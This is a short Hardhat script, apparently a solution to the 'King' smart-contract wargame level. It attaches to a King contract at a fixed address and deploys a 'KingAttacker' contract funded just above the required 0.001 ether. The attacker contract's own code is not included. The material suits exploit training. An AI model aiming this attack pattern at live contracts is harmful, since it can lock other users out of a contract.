import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x474f1D537246A4bf1364De0610eaa6811faDfD3d";
const CONTRACT_NAME = "King";
const ATTACKER_NAME = "KingAttacker";

async function main() {
  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const etherToSend = ethers.utils.parseEther("0.001").add(1);

  const attackerContractFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerContractFactory.deploy(contract.address, { value: etherToSend });
  await attackerContract.deployed();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
